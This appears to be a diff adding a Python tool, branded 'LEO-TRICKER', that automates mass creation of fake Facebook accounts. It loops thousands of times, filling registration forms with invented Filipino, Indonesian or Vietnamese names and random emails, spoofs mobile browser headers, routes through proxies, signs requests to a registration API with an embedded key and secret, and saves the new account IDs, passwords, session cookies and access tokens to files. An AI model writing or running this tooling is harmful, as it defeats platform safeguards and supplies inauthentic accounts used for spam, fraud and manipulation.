+        " \033[1;32m[\033[1;31m–\033[1;32m] IF NO RESULT \033[1;33m[\033[1;31mON\033[1;33m/\033[1;31mOFF\033[1;33m] \033[1;32mAIRPLAN MODE"
+    )
+    linex()
+    for make in range(50000):
+        global oks, cps
+        boos = random.choice([P, M, H, K, B, U, O, N])
+        sys.stdout.write(
+            f"\r\r\033[1;37m<[{boos}LEO-TRICKER\033[1;37m]<🖤>[{make + 1}|\033[1;32m{oks}\033[1;37m]> "
+        )
+        sys.stdout.flush()
+        # sys.stdout.write(f"\r\r\033[1;37m[CHAND-CREATE] {make+1}\033[1;37m|\033[1;32mOK-:{len(oks)}\033[1;37m");sys.stdout.flush()
+        ses = requests.Session()
+        response = ses.get(
+            url="https://x.facebook.com/reg",
+            params={
+                "_rdc": "1",
+                "_rdr": "",
+                "wtsid": "rdr_0t3qOXoIHbMS6isLw",
+                "refsrc": "deprecated",
+            },
+        )
+        mts = ses.get("https://x.facebook.com").text
+        m_ts = re.search(r'name="m_ts" value="(.*?)"', str(mts)).group(1)
+        formula = extractor(response.text)
+        if ethan_username in ["1", "01"]:
+            firstname, lastname = fake_philippines()
+        if ethan_username in ["2", "02"]:
+            firstname, lastname = fake_indonesia()
+        if ethan_username in ["3", "03"]:
+            firstname, lastname = fake_vietnamese()
+        domain = random.choice(
+            [
+                "gmail.com",
+                "hotmail.com",
+                "outlook.com",
+                "yahoo.com",
+                "myyahoo.com",
+                "protonmail.com",
+                "live.com",
+                "rocket.com",
+            ]
+        )
+        email2 = (
+            f"{firstname.lower()}{lastname.lower()}{random.randint(10, 99)}@{domain}"
+        )
+        if ethan_password in ["1", "01"]:
+            pasw2 = f"{firstname.lower()}{lastname.lower()}"
+        # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] NAME   : {firstname} {lastname}")
+        # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] EMAIL  : {email2}")
+        cookies = None
+        payload1 = None
+        payload2 = {}
+        payload3 = {}
+        payload3 = {
+            "ccp": "2",
+            "reg_instance": str(formula["reg_instance"]),
+            "submission_request": "true",
+            "helper": "",
+            "reg_impression_id": str(formula["reg_impression_id"]),
+            "ns": "1",
+            "zero_header_af_client": "",
+            "app_id": "103",
+            "logger_id": str(formula["logger_id"]),
+            "field_names[0]": "firstname",
+            "firstname": firstname,
+            "lastname": lastname,
+            "field_names[1]": "birthday_wrapper",
+            "birthday_day": str(random.randint(1, 28)),
+            "birthday_month": str(random.randint(1, 12)),
+            "birthday_year": str(random.randint(1992, 2009)),
+            "age_step_input": "",
+            "did_use_age": "false",
+            "field_names[2]": "reg_email__",
+            "reg_email__": email2,
+            "field_names[3]": "sex",
+            "sex": "2",
+            "preferred_pronoun": "",
+            "custom_gender": "",
+            "field_names[4]": "reg_passwd__",
+            "name_suggest_elig": "false",
+            "was_shown_name_suggestions": "false",
+            "did_use_suggested_name": "false",
+            "use_custom_gender": "false",
+            "guid": "",
+            "pre_form_step": "",
+            "encpass": "#PWD_BROWSER:0:{}:{}".format(
+                str(time.time()).split(".")[0], pasw2
+            ),
+            "submit": "Sign Up",
+            "fb_dtsg": "NAcMC2x5X2VrJ7jhipS0eIpYv1zLRrDsb5y2wzau2bw3ipw88fbS_9A:0:0",
+            "jazoest": str(formula["jazoest"]),
+            "lsd": str(formula["lsd"]),
+            "__dyn": "1ZaaAG1mxu1oz-l0BBBzEnxG6U4a2i5U4e0C8dEc8uwcC4o2fwcW4o3Bw4Ewk9E4W0pKq0FE6S0x81vohw5Owk8aE36wqEd8dE2YwbK0iC1qw8W0k-0jG3qaw4kwbS1Lw9C0le0ue0QU",
+            "__csr": "",
+            "__req": "p",
+            "__fmt": "1",
+            "__a": "AYkiA9jnQluJEy73F8jWiQ3NTzmH7L6RFbnJ_SMT_duZcpo2yLDpuVXfU2doLhZ-H1lSX6ucxsegViw9lLO6uRx31-SpnBlUEDawD_8U7AY4kQ",
+            "__user": "0",
+        }
+        header1 = {
+            "Host": "m.facebook.com",
+            "Connection": "keep-alive",
+            "Upgrade-Insecure-Requests": "1",
+            "User-Agent": W_ueragent(),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "dnt": "1",
+            "X-Requested-With": "mark.via.gp",
+            "Sec-Fetch-Site": "none",
+            "Sec-Fetch-Mode": "navigate",
+            "Sec-Fetch-User": "?1",
+            "Sec-Fetch-Dest": "document",
+            "dpr": "1.75",
+            "viewport-width": "980",
+            "sec-ch-ua": '"Android WebView";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "sec-ch-ua-platform-version": '""',
+            "sec-ch-ua-model": '""',
+            "sec-ch-ua-full-version-list": "",
+            "sec-ch-prefers-color-scheme": "dark",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
+        }
+        reg_url = "https://www.facebook.com/reg/submit/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM0NDE0OTk2LCJjYWxsc2l0ZV9pZCI6OTA3OTI0NDAyOTQ4MDU4fQ%3D%3D&multi_step_form=1&skip_suma=0&shouldForceMTouch=1"
+        while True:
+            try:
+                py_submit = ses.post(reg_url, data=payload3, headers=header1, proxies=proxies)
+                break
+            except:
+                wait_conn()
+        if "c_user" in py_submit.cookies:
+            # first_cok = ses.cookies.get_dict()
+            # uid = str(first_cok["c_user"])
+            # cookie = (";").join([ "%s=%s" % (key,value) for key,value in ses.cookies.get_dict().items()])
+            cok = ";".join([k + "=" + v for k, v in ses.cookies.get_dict().items()])
+            uid = re.findall("c_user=(.*?);", cok)[0]
+            coki = (
+                cvt("oks", ses.cookies.get_dict())
+                + "dpr=2;locale=en_US;wd=950x1835;m_page_voice="
+                + uid
+            )
+            print("\r\033[1;32m<[LEO-OK]> " + uid + " | " + pasw2 + "\033[1;37m")
+            # print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+coki)
+            # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] UID    : {uid}")
+            # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] PASS   : {pasw2}")
+            # print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] COOKIE : {coki}")
+            # linex()
+            file_path_ok = os.path.join(folder_path, "LEO-CREATE-OK.txt")
+            file_path_cookies = os.path.join(folder_path, "LEO-CREATE-COOKIE.txt")
+            with (
+                open(file_path_ok, "a") as file_ok,
+                open(file_path_cookies, "a") as file_cookies,
+            ):
+                file_ok.write(uid + " | " + pasw2 + "\n")
+                file_cookies.write(uid + " | " + pasw2 + " |-----> " + coki + "\n")
+            oks += 1
+        else:
+            # print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mSUCCESSFULLY CHECKPOINT ID")
+            # linex()
+            cps += 1
+
+
+# ------------------[ METHOD 2 ]-------------------#
+def auto_create_fb_method_2_() -> None:
+    clear()
+    print(" \033[1;32m[\033[1;31m1\033[1;32m] NAME PHILIPPINE")
+    print(" \033[1;32m[\033[1;31m2\033[1;32m] NAME INDONESIA")
+    print(" \033[1;32m[\033[1;31m3\033[1;32m] NAME VIETNAMESE")
+    linex()
+    ethan_username = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
+    linex()
+    print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD")
+    print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD")
+    linex()
+    ethan_password = input(" \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ")
+    linex()
+    if ethan_password in ["2", "02"]:
+        pasw2 = input(" \033[1;32m[\033[1;31m–\033[1;32m] ENTER CUSTOM PASSWORD : ")
+        linex()
+    for make in range(1000):
+        sys.stdout.write(
+            f"\r\r\033[1;37m<[{boos}MR-LEO\033[1;37m]<🖤>[{make + 1}|\033[1;32m{len(ok)}\033[1;37m]> "
+        )
+        sys.stdout.flush()
+        ses = requests.Session()
+        fake = Faker()
+        api_key = "882a8490361da98702bf97a021ddc14d"
+        secret = "62f8ce9f74b12f84c123cc23437a4a32"
+        gender = random.choice(["M", "F"])
+        if ethan_username in ["1", "01"]:
+            firstname, lastname = fake_philippines()
+        if ethan_username in ["2", "02"]:
+            firstname, lastname = fake_indonesia()
+        if ethan_username in ["3", "03"]:
+            firstname, lastname = fake_vietnamese()
+        domain = random.choice(
+            [
+                "gmail.com",
+                "hotmail.com",
+                "outlook.com",
+                "yahoo.com",
+                "myyahoo.com",
+                "protonmail.com",
+                "live.com",
+                "rocket.com",
+            ]
+        )
+        email2 = (
+            f"{firstname.lower()}{lastname.lower()}{random.randint(10, 99)}@{domain}"
+        )
+        if ethan_password in ["1", "01"]:
+            pasw2 = f"{firstname.lower()}{lastname.lower()}"
+        time.sleep(5)
+        print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] NAME   : {firstname} {lastname}")
+        print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] EMAIL  : {email2}")
+        birthday = fake.date_of_birth(minimum_age=18, maximum_age=90)
+        req = {
+            "api_key": api_key,
+            "attempt_login": True,
+            "birthday": birthday.strftime("%Y-%m-%d"),
+            "client_country_code": "US",
+            "fb_api_caller_class": "com.facebook.registration.protocol.RegisterAccountMethod",
+            "fb_api_req_friendly_name": "registerAccount",
+            "firstname": firstname,
+            "format": "json",
+            "gender": gender,
+            "lastname": lastname,
+            "email": email2,
+            "locale": "en_US",
+            "method": "user.register",
+            "password": pasw2,
+            "reg_instance": generate_random_string(32),
+            "return_multiple_errors": True,
+        }
+        headers = {"User-Agent": user_agent()}
+        sorted_req = sorted(req.items(), key=lambda x: x[0])
+        sig = "".join(f"{k}={v}" for k, v in sorted_req)
+        ensig = hashlib.md5((sig + secret).encode()).hexdigest()
+        req["sig"] = ensig
+        api_url = "https://b-api.facebook.com/method/user.register"
+        while True:
+            try:
+                response = ses.post(api_url, data=req, headers=headers, proxies=proxies)
+                break
+            except:
+                wait_conn()
+        reg = response.json()
+        uid = reg.get("new_user_id")
+        token = reg.get("session_info", {}).get("access_token")
+        if uid:
+            status = lock_checker(uid)
+            if status == "Locked":
+                print(
+                    f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mSUCCESSFULLY CHECKPOINT ID"
+                )
+            else:
+                print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] UID    : {uid}")
+                print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] PASS   : {pasw2}")
+                print(f"\r \033[1;32m[\033[1;31m–\033[1;32m] TOKEN  : {token}")
+                linex()
+                ok.append(uid)
+        else:
+            print(
+                f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mSUCCESSFULLY CHECKPOINT ID"
+            )
+            linex()
+
+
+# ------------------[ METHOD 3 SPREAD UID ]-------------------#
+SPREAD_FOLDER = "SPREAD-UID-LEO"
+
+
+def auto_create_fb_method_3_():
+    clear()
+    linex()
+    print(" \033[1;32m[\033[1;31m–\033[1;32m] SPREAD UID")
+    linex()
+    path = input(" \033[1;32m[\033[1;31m–\033[1;32m] ENTER TXT FILE PATH : ").strip()
+    if not path:
+        print(" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mNO FILE SELECTED")
+        time.sleep(2)
+        menu()
+        return
+    try:
+        with open(path, "r") as f:
+            lines = [line.strip() for line in f if line.strip()]
+    except:
+        print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;31mFILE NOT FOUND: {path}")
+        time.sleep(2)
+        menu()
+        return
+    os.makedirs(SPREAD_FOLDER, exist_ok=True)
+    out_path = os.path.join(SPREAD_FOLDER, "SPREAD-UID.txt")
+    total = len(lines)
+    count = 0
+    print(f" \033[1;32m[\033[1;31m–\033[1;32m] TOTAL LINES: \033[1;37m{total}")
+    linex()
+    with open(out_path, "w") as out:
+        for line in lines:
+            uid = line.split("|")[0].split(",")[0].split()[0].strip()
+            if uid and uid.isdigit():
+                out.write(uid + "\n")
+                count += 1
+                sys.stdout.write(f"\r\033[1;32m[SPREAD] {uid}                    \n")
+                sys.stdout.flush()
+    linex()
+    print(f" \033[1;32m[\033[1;31m–\033[1;32m] ✅ SPREAD: \033[1;37m{count}")
+    print(f" \033[1;32m[\033[1;31m–\033[1;32m] \033[1;37mSAVED TO: {SPREAD_FOLDER}/SPREAD-UID.txt")
+    input("\n \033[1;33mPress ENTER to go back...")
+    menu()
+
+
+# ------------------[  END  ]-------------------#
+if __name__ == "__main__":
+    while True:
+        try:
+            if approval():
+                menu()
+            else:
+                exit("\033[1;31m━▷ Access Denied! Get approval first.")
+        except:
+            wait_conn()
